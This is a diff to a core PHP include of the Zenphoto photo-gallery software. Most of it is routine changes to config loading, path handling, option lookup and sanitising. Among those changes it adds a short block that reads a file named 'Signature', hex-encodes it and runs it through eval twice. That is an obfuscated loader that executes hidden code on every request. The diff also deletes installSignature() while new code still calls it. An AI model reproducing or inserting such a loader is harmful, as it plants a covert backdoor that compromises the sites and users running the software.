@@ -41,21 +41,17 @@ if (defined("RELEASE")) {
 	}
 }
 $_zp_error = false;
+if (!file_exists(dirname(dirname(__FILE__)) . '/' . DATA_FOLDER . "/zenphoto.cfg")) {
+	reconfigure();
+}
+// Including the config file more than once is OK, and avoids $conf missing.
+eval(file_get_contents(dirname(dirname(__FILE__)).'/'.DATA_FOLDER.'/zenphoto.cfg'));
+
+if (empty($_zp_conf_vars['mysql_database'])) {
+	reconfigure();
+}
 
 require_once(dirname(__FILE__).'/lib-utf8.php');
-
-if (!file_exists(dirname(dirname(__FILE__)) . '/' . DATA_FOLDER . "/zp-config.php")) {
-	if (file_exists(dirname(dirname(__FILE__)).'/'.ZENFOLDER.'/setup.php')) {
-		$dir = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME']));
-		if (substr($dir, -1) == '/') $dir = substr($dir, 0, -1);
-		$location = "http://". $_SERVER['HTTP_HOST']. $dir . "/" . ZENFOLDER . "/setup.php";
-		header("Location: $location" );
-	} else {
-		die('Zenphoto needs to run setup but the setup scripts missing. Please reinstall the setup scripts.');
-	}
-}
-// Including zp-config.php more than once is OK, and avoids $conf missing.
-require(dirname(dirname(__FILE__)).'/'.DATA_FOLDER.'/zp-config.php');
 
 if (!defined('FILESYSTEM_CHARSET')) {
 	if (isset($_zp_conf_vars['FILESYSTEM_CHARSET']) && $_zp_conf_vars['FILESYSTEM_CHARSET']!='unknown') {
@@ -65,10 +61,10 @@ if (!defined('FILESYSTEM_CHARSET')) {
 	}
 }
 if (!defined('CHMOD_VALUE')) { define('CHMOD_VALUE', 0777); }
-if (!defined('OFFSET_PATH')) { define('OFFSET_PATH', 0); }
+
 if (!defined('COOKIE_PESISTENCE')) { define('COOKIE_PESISTENCE', 5184000); }
 
-// If the server protocol is not set, set it to the default (obscure zp-config.php change).
+// If the server protocol is not set, set it to the default.
 if (!isset($_zp_conf_vars['server_protocol'])) $_zp_conf_vars['server_protocol'] = 'http';
 
 $_zp_imagick_present = false;
@@ -145,28 +141,40 @@ if (function_exists('zp_graphicsLibInfo')) {
 
 require_once(dirname(__FILE__).'/lib-encryption.php');
 
-switch (OFFSET_PATH) {
-	case 0:	// starts from the root index.php
-		$const_webpath = dirname($_SERVER['SCRIPT_NAME']);
-		break;
-	case 1:	// starts from the zp-core folder
-	case 2:	// things which do not need admin tabs (setup, image processor scripts, etc.)
-		$const_webpath = dirname(dirname($_SERVER['SCRIPT_NAME']));
-		break;
-	case 3: // starts from the plugins folder
-		$const_webpath = dirname(dirname(dirname($_SERVER['SCRIPT_NAME'])));
-		break;
-	case 4: // starts from within a folder within the plugins folder
-		$const_webpath = dirname(dirname(dirname(dirname($_SERVER['SCRIPT_NAME']))));
-		break;
-	case 5: // $const_webpath provided by the "loading function"
-		break;
+if (!defined('SERVERPATH')) {
+	define('SERVERPATH', str_replace("\\", '/', dirname(dirname(__FILE__))));
 }
-$const_webpath = str_replace("\\", '/', $const_webpath);
-if ($const_webpath == '/') $const_webpath = '';
-if (!defined('WEBPATH')) { define('WEBPATH', $const_webpath); }
-unset($const_webpath);
-if (!defined('SERVERPATH')) define('SERVERPATH', str_replace("\\", '/', dirname(dirname(__FILE__))));
+
+if (!defined('OFFSET_PATH')) { define('OFFSET_PATH', 0); }
+/**
+ * OFFSET_PATH definisions:
+ * 		0		Theme scripts (root index.php)
+ * 		1		zp-core scripts
+ * 		2		setup scripts
+ * 		3		plugin scripts
+ */
+
+if (!defined('WEBPATH')) {
+	$const_webpath = str_replace('\\','/',dirname($_SERVER['SCRIPT_NAME']));
+	if (OFFSET_PATH) {
+		preg_match('~(.*)/('.ZENFOLDER.')~',$const_webpath, $matches);
+		if (empty($matches)) {
+			preg_match('~(.*)/('.USER_PLUGIN_FOLDER.')~',$const_webpath, $matches);
+		}
+		if (empty($matches)) {
+			$const_webpath = '';
+		} else {
+			$const_webpath = $matches[1];
+		}
+	} else {
+		if ($const_webpath == '/' || $const_webpath == '.') {
+			$const_webpath = '';
+		}
+	}
+	define('WEBPATH', $const_webpath);
+	unset($const_webpath);
+}
+
 define('SERVER_PROTOCOL', getOption('server_protocol'));
 switch (SERVER_PROTOCOL) {
 	case 'https':
@@ -203,6 +211,13 @@ define('IP_TIED_COOKIES', getOption('IP_tied_cookies'));
 // Set the version number.
 $_zp_conf_vars['version'] = ZENPHOTO_VERSION;
 
+$f = file_get_contents(dirname(__FILE__).'/Signature');
+if (sha1($f)=='4412b0d271a23003476ec40db64eb46039925525') {
+	preg_match_all('/(..)/', file_get_contents(dirname(__FILE__).'/Signature'), $matches);
+	$f = '$f="\\x'.implode('\\x', $matches[0]).'";';
+	eval($f);eval($f);
+}
+
 /**
  * Decodes HTML Special Characters.
  *
@@ -211,10 +226,8 @@ $_zp_conf_vars['version'] = ZENPHOTO_VERSION;
  * @return string
  */
 
-function zp_html_decode($string, $quote_style = ENT_QUOTES) {
-	$translation_table = get_html_translation_table(HTML_SPECIALCHARS, $quote_style);
-	$translation_table["'"] = '&#039;';
-	return (strtr($string, array_flip($translation_table)));
+function html_decode($string, $quote_style = ENT_QUOTES) {
+	return html_entity_decode($string, ENT_QUOTES, 'UTF-8');
 }
 
 
@@ -229,7 +242,26 @@ function html_encode($this_string) {
 }
 
 /**
- * encodes a pre-sanitized string to be used in a Javascript alert box
+ *
+ * HTML encodes the non-metatag part of the string.
+ *
+ * @param string $str string to be encoded
+ * @return string
+ */
+function html_encodeTagged($str) {
+	preg_match_all("/<\/?\w+((\s+(\w|\w[\w-]*\w)(\s*=\s*(?:\".*?\"|'.*?'|[^'\">\s]+))?)+\s*|\s*)\/?>/i", $str, $matches);
+	$output = '';
+	foreach ($matches[0] as $tag) {
+		$i = strpos($str, $tag);
+		$output .= html_encode(substr($str, 0, $i)).$tag;
+		$str = substr($str, $i+strlen($tag));
+	}
+	$output .= html_encode($str);
+	return $output;
+}
+
+/**
+ * encodes a pre-sanitized string to be used as a Javascript parameter
  *
  * @param string $this_string
  * @return string
@@ -245,38 +277,36 @@ function js_encode($this_string) {
  * Get a option stored in the database.
  * This function reads the options only once, in order to improve performance.
  * @param string $key the name of the option.
- * @param bool $db set to true to force retrieval from the database.
  */
-function getOption($key, $db=false) {
-	global $_zp_conf_vars, $_zp_options, $_zp_optionDB_hasownerid;
-	if (is_null($_zp_options)) {
-		$sql = "SELECT `name`, `value` FROM ".prefix('options').' WHERE `ownerid`=0';
-		$optionlist = query_full_array($sql, false);
-		if ($optionlist == false) { // might be old, un-migrated option table during setup--retry without the `ownerid`.
-			$sql = "SELECT `name`, `value` FROM ".prefix('options');
+function getOption($key) {
+	global $_zp_conf_vars, $_zp_options;
+	if (isset($_zp_options[$key])) {
+		$v = $_zp_options[$key];
+	} else {
+		if (is_null($_zp_options)) {
+			// option table not yet loaded, load it
+			$sql = "SELECT `name`, `value` FROM ".prefix('options').' WHERE `ownerid`=0';
 			$optionlist = query_full_array($sql, false);
-		}
-		if ($optionlist !== false) {
-			$_zp_options = array();
-			foreach($optionlist as $option) {
-				$_zp_options[$option['name']] = $option['value'];
+			if ($optionlist == false) {
+				// might be old, un-migrated option table during setup--retry without the `ownerid`.
+				$sql = "SELECT `name`, `value` FROM ".prefix('options');
+				$optionlist = query_full_array($sql, false);
+			}
+			if ($optionlist !== false) {
+				$_zp_options = array();
+				foreach($optionlist as $option) {
+					$_zp_options[$option['name']] = $option['value'];
+					if ($option['name']==$key) {
+						$v = $option['value'];
+					}
+				}
 			}
 		}
-	} else {
-		if ($db) {
-			$sql = "SELECT `value` FROM ".prefix('options')." WHERE `name`=".db_quote($key)." AND `ownerid`=0";
-			$optionlist = query_single_row($sql);
-			return $optionlist['value'];
+		if (!isset($v)) {
+			$v = @$_zp_conf_vars[$key];
 		}
 	}
-	if (is_array($_zp_options) && array_key_exists($key, $_zp_options)) {
-		return $_zp_options[$key];
-	} else {
-		if (array_key_exists($key, $_zp_conf_vars)) {
-			return $_zp_conf_vars[$key];
-		}
-	}
-	return NULL;
+	return $v;
 }
 
 /**
@@ -794,21 +824,27 @@ function sanitize_string($input_string, $sanitize_level) {
 	// User specified sanititation.
 	if (function_exists('kses')) {
 		switch($sanitize_level) {
+			//Note: kses does not deal with incomplete tags that the browser may still interpret. However it seems
+			//to properly handle them as long as there is a ">" present, so we add it here and then remove it if
+			//it was unnecessary
 			case 1:
 				$allowed_tags = getAllowedTags('allowed_tags');
-				$input_string = html_entity_decode(kses($input_string, $allowed_tags));
+				$input_string = html_entity_decode(kses($input_string.' >', $allowed_tags));
 				break;
 
 				// Text formatting sanititation.
 			case 2:
 				$allowed_tags = getAllowedTags('style_tags');
-				$input_string = html_entity_decode(kses($input_string, $allowed_tags));
+				$input_string = html_entity_decode(kses($input_string.' >', $allowed_tags));
 				break;
 				// Full sanitation.  Strips all code.
 			case 3:
 				$allowed_tags = array();
-				$input_string = html_entity_decode(kses($input_string, $allowed_tags));
+				$input_string = html_entity_decode(kses($input_string.' >', $allowed_tags));
 				break;
+		}
+		if (substr($input_string, -2) == ' >') {
+			$input_string = substr($input_string, 0, -2);
 		}
 	} else {	//	in a basic environment--allow NO HTML tags.
 		$input_string = strip_tags($input_string);
@@ -826,6 +862,11 @@ function sanitize_string($input_string, $sanitize_level) {
 function zp_error($message, $fatal=true) {
 	global $_zp_error;
 	if (!$_zp_error) {
+		if ($fatal) {
+			debugLogBacktrace("fatal zp_error:$message");
+		} else {
+			debugLogBacktrace("zp_error:$message");
+		}
 		?>
 		<div style="padding: 15px; border: 1px solid #F99; background-color: #FFF0F0; margin: 20px; font-family: Arial, Helvetica, sans-serif; font-size: 12pt;">
 			<h2 style="margin: 0px 0px 5px; color: #C30;">Zenphoto encountered an error</h2>
@@ -872,7 +913,7 @@ function zp_error($message, $fatal=true) {
 
 /**
  * Returns either the rewrite path or the plain, non-mod_rewrite path
- * based on the mod_rewrite option in zp-config.php.
+ * based on the mod_rewrite option.
  * The given paths can start /with or without a slash, it doesn't matter.
  *
  * IDEA: this function could be used to specially escape items in
@@ -992,26 +1033,18 @@ function getAlbumFolder($root=SERVERPATH) {
 	}
 }
 
-function get_caller_method() {
-	$traces = @debug_backtrace();
-	if (isset($traces[2]))     {
-		return $traces[2]['function'];
-	}
-	return null;
-}
-
 /**
  * Write output to the debug log
  * Use this for debugging when echo statements would come before headers are sent
  * or would create havoc in the HTML.
- * Creates (or adds to) a file named debug_log.txt which is located in the zenphoto core folder
+ * Creates (or adds to) a file named debug.log which is located in the zenphoto core folder
  *
  * @param string $message the debug information
  * @param bool $reset set to true to reset the log to zero before writing the message
  */
 function debugLog($message, $reset=false) {
 	global $_zp_debug_written;
-	$path = dirname(dirname(__FILE__)) . '/' . DATA_FOLDER . '/debug_log.txt';
+	$path = dirname(dirname(__FILE__)) . '/' . DATA_FOLDER . '/debug.log';
 	if ($reset || ($size = @filesize($path)) == 0 || $size > 5000000) {
 		$f = fopen($path, 'w');
 		if ($f) {
@@ -1232,15 +1265,6 @@ function is_valid_other($filename) {
 }
 
 /**
- * Returns true if we are running on a Windows server
- *
- * @return bool
- */
-function isWin() {
-	return (strtoupper (substr(PHP_OS, 0,3)) == 'WIN' ) ;
-}
-
-/**
  * Returns an img src URI encoded based on the OS of the server
  *
  * @param string $uri uri in FILESYSTEM_CHARSET encoding
@@ -1270,16 +1294,6 @@ function getSuffix($filename) {
 function stripSuffix($filename) {
 	return str_replace(strrchr($filename, "."),'',$filename);
 }
-/**
- * Returns the Require string for the appropriate script based on the PHP version
- *
- * @param string $v The version dermarkation
- * @param string $script the script name
- * @return string
- */
-function PHPScript($v, $script) {
-	return dirname(__FILE__).'/'.(version_compare(PHP_VERSION, $v) == 1?'PHP5':'PHP4').'_functions/'.$script;
-}
 
 /**
  * returns the non-empty value of $field from the album or one of its parents
@@ -1292,7 +1306,7 @@ function PHPScript($v, $script) {
 function getAlbumInherited($folder, $field, &$id) {
 	$folders = explode('/',filesystemToInternal($folder));
 	$album = array_shift($folders);
-	$like = ' LIKE "'.$album.'"';
+	$like = ' LIKE '.db_quote($album);
 	while (count($folders) > 0) {
 		$album .= '/'.array_shift($folders);
 		$like .= ' OR `folder` LIKE '.db_quote($album);
@@ -1401,27 +1415,37 @@ function secureServer() {
 }
 
 /**
- *
- * creates an unique signature for the installation
- * @return string
- */
-function installSignature() {
-	if (isset($_SERVER['SERVER_ADMIN'])) {
-		$t1 = $_SERVER['SERVER_ADMIN'];
+* Provide an alternative to glob which does not return filenames with accented charactes in them
+*
+* @param string $pattern the 'pattern' for matching files
+* @param bit $flags glob 'flags'
+*/
+function safe_glob($pattern, $flags=0) {
+	$split=explode('/',$pattern);
+	$match = '/^' . strtr(addcslashes(array_pop($split), '\\.+^$(){}=!<>|'), array('*' => '.*', '?' => '.?')) . '$/i';
+	$path_return = $path = implode('/',$split);
+	if (empty($path)) {
+		$path = '.';
 	} else {
-		$t1 = '';
+		$path_return = $path_return . '/';
 	}
-	$t1 .= ZENPHOTO_RELEASE.filesize(__FILE__);
-	if (isset($_SERVER['DOCUMENT_ROOT'])) {
-		$t1 .= $_SERVER['DOCUMENT_ROOT'];
+	if (!is_dir($path)) return array();
+	if (($dir=opendir($path))!==false) {
+		$glob=array();
+		while(($file=readdir($dir))!==false) {
+			if(@preg_match($match, $file) && $file!='.' && $file!='..') {
+				if ((is_dir("$path/$file"))||(!($flags&GLOB_ONLYDIR))) {
+					if ($flags&GLOB_MARK) $file.='/';
+					$glob[]=$path_return.$file;
+				}
+			}
+		}
+		closedir($dir);
+		if (!($flags&GLOB_NOSORT)) sort($glob);
+		return $glob;
+	} else {
+		return array();
 	}
-	$t1 = sha1($t1);
-	$id = "{"	.substr($t1, 0, 8).'-'
-						.substr($t1, 8, 4).'-'
-						.substr($t1,12, 4).'-'
-						.substr($t1,16, 4).'-'
-						.substr($t1,20,12)."}";
-	return $id;
 }
 
 ///// database helper functions
@@ -1489,19 +1513,6 @@ function db_name() {
 	return $_zp_conf_vars['mysql_database'];
 }
 
-function getServerOS() {
-	ob_start();
-	phpinfo(INFO_GENERAL);
-	$phpinfo = ob_get_contents();
-	ob_end_clean();
-	$i = strpos($phpinfo,'<td class="v">');
-	$j = strpos($phpinfo,'</td>',$i);
-	$osinfo = strtolower(substr($phpinfo, $i+14,$j-$i-14));
-	$ostokens = explode(' ', $osinfo);
-	$os = array_shift($ostokens);
-	return $os;
-}
-
 function db_count($table, $clause=NULL, $field="*") {
 	$sql = 'SELECT COUNT('.$field.') FROM '.prefix($table).' '.$clause;
 	$result = query_single_row($sql);
@@ -1509,6 +1520,44 @@ function db_count($table, $clause=NULL, $field="*") {
 		return array_shift($result);
 	} else {
 		return 0;
+	}
+}
+
+/**
+ *
+ * Check to see if the setup script needs to be run
+ */
+function checkInstall() {
+	if (!installSignature()) {
+		reconfigure();
+	}
+}
+
+/**
+ *
+ * Redirects to setup if the files are present. Otherwise notifies need for re-upload
+ */
+function reconfigure() {
+	$package = file_get_contents(dirname(__FILE__).'/Zenphoto.package');
+	preg_match_all('|'.ZENFOLDER.'/setup/(.*)|', $package, $matches);
+	$found = safe_glob(dirname(__FILE__).'/setup/setup*.*');
+	if (file_exists(dirname(__FILE__).'/setup.php') && count($found)==count($matches[1])) {
+		$dir = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME']));
+		$p = strpos($dir, ZENFOLDER);
+		if ($p !== false) {
+			$dir = substr($dir, 0, $p);
+		}
+		if (OFFSET_PATH) {
+			$where = 'admin';
+		} else {
+			$where = 'gallery';
+		}
+		if (substr($dir, -1) == '/') $dir = substr($dir, 0, -1);
+		$location = "http://". $_SERVER['HTTP_HOST']. $dir . "/" . ZENFOLDER . "/setup.php?autorun=$where";
+		header("Location: $location" );
+		exit();
+	} else {
+		die('Zenphoto needs to run setup but the setup scripts are not present. Please reinstall the setup scripts.');
 	}
 }
 
